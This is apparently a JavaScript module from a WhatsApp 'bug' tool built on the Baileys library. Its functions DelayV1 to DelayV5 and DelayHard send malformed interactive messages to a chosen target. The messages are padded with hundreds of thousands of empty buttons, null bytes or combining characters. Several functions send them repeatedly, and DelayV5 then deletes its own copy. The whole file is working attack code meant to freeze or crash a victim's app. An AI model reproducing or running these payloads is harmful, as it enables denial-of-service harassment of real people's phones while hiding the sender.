// src/services/bug/delay.js — varian Delay (private chat).
// Diekstrak dari hasil_date.js: DelayV1, DelayV2, DelayV3, DelayV4, DelayV5, DelayHard.
import { generateWAMessageFromContent } from "baileys";
import { sleep } from "./helpers.js";

export async function DelayV5(sock, target) {
  for (let i = 0; i < 2; i++) {
    await sleep(500);
    const msg = generateWAMessageFromContent(
      target,
      {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: { text: "ี".repeat(5000) },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(9999),
                buttons: "ี".repeat(500000),
              },
              contextInfo: {
                remoteJid: "#",
                externalAdReply: {
                  showAdAttribution: true,
                  title: "vault!nspect",
                  body: "superior3xplanation",
                  thumbnailUrl: "https://files.catbox.moe/ur8m20.jpg",
                  sourceUrl: "https://vsp-killer.gov/",
                  mediaType: 1,
                  renderLargerThumbnail: true,
                },
              },
            },
          },
        },
      },
      {},
    );

    await sock.relayMessage(target, msg.message, {});

    await sock.chatModify(
      {
        delete: true,
        lastMessages: [
          {
            key: { remoteJid: target, fromMe: true, id: msg.key.id },
            messageTimestamp: Date.now(),
          },
        ],
      },
      target,
    );
  }
}

export async function DelayV4(sock, target) {
  const payload = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "izin @mexxreall" + "\0".repeat(20000), format: "FOUR" },
          nativeFlowMessage: {
            name: "cta_call",
            buttonParamsJson: "\0",
            buttons: Array.from({ length: 500000 }, () => ({})),
          },
          contextInfo: {
            quotedMessage: { richResponseMessage: {} },
          },
        },
      },
    },
  };
  await sock.relayMessage(target, payload, { noSelfSync: true });
}

export async function DelayV2(sock, target) {
  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 3,
          },
          interactiveMessage: {
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net",
              },
            },
            body: { text: "\x10".repeat(5000) },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: Array.from({ length: 500000 }, () => ({})),
            },
          },
        },
      },
    },
    { participant: true },
  );
}

export async function DelayV1(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "izin @mexxreall" },
          NativeFlowMessage: {
            buttons: ["0@s.whatsapp.net", ...Array.from({ length: 1999 })],
            name: "\x10".repeat(50000),
          },
          nativeFlowMessage: {
            name: "galaxy_message",
            buttons: "\u0000".repeat(250000) + "\x10".repeat(250000),
          },
        },
      },
    },
  };

  await sock.relayMessage(target, msg, {});
}

export async function DelayV3(sock, target) {
  const jid = target.includes("@") ? target : `${target}@s.whatsapp.net`;

  const payload = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "⎈" },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({})),
            nativeFlowResponsMessage: {
              buttons: Array.from({ length: 500000 }, () => ({})),
            },
          },
        },
      },
    },
  };

  for (let i = 0; i < 500; i++) {
    await sock.relayMessage(jid, payload, {});
    await sleep(20);
  }
}

export async function DelayHard(sock, target) {
  for (let x = 0; x < 50; x++) {
    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 3,
            },
            interactiveMessage: {
              contextInfo: {
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: { businessOwnerJid: target },
              },
              body: { text: "izin @mexxreall" },
              nativeFlowMessage: {
                buttons: Array.from({ length: 500000 }, () => ({})),
              },
            },
          },
        },
      },
      { participant: { jid: target } },
    );
  }
}
